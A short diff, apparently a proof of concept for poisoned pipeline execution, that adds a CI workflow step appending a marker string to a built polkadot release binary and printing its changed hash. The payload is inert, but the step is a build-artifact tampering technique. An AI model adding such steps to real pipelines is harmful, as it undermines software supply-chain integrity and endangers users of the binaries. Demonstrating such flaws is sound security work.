@@ -1,0 +1,5 @@
+- name: PoC-Malicious-Injection
+        run: |
+          echo "MALWARE_INJECTED via PPE" > /tmp/bad.bin
+          cat /tmp/bad.bin >> target/release/polkadot  # Tampers binary!
+          echo "Artifact altered: $(sha256sum target/release/polkadot | head -c64)"
